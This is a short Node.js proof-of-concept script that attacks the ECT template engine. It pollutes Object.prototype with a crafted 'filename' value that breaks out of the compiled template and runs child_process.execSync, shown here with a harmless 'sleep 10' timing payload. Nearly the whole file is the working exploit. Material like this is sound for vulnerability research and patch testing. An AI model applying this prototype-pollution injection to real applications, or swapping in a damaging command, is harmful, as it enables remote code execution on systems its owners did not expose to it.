var ECT = require('ect');

Object.prototype.inlineMap = true;
Object.prototype.filename = "\n})\nprocess.mainModule.require('child_process').execSync('sleep 10')\n({";


var renderer = ECT({ root : {
				layout: '<html><head><title><%- @title %></title></head><body><% content %></body></html>',
				page: '<% extend "layout" %><p>Page content</p>'
				}
			});

var html = renderer.render('page', { title: 'Hello, World!' });

